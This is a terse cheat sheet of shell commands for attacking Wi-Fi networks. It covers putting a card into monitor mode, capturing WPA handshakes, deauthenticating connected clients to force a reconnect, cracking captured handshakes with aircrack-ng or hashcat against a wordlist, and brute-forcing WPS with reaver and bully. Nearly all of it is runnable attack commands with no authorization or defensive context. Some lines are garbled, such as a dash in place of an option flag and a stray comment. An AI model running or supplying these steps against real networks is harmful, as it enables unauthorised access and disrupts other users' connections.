# put your network device into monitor mode
airmon-ng start wlan0
# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng wlan0mon
#or
wash -i wlan0mon
# start listening for the handshake
airodump-ng -c chan — bssid mac -w hs/ wlan0mon0
# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a mac -c client wlan0mon
########## crack password with aircrack-ng… ##########
#
# crack w/ aircrack-ng
aircrack-ng -a2 -b mac -w rockyou.txt capture/-01.cap
########## or crack password with naive-hashcat ##########
# NEED GPU FOR THAT ONE? IntelNative Library Build Please
# convert cap to hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx
# crack with naive-hashcat
HASH_FILE=file.hccapx POT_FILE=file.pot HASH_TYPE=2500 ./naive-hashcat.sh
# reaver
reaver -i wlan0mon -b mac -c chan -vvv -K 1 -f -d 30
# DELAYS!!!
# bully
bully wlan0mon -b mac  -c chan -t 30 -dFS
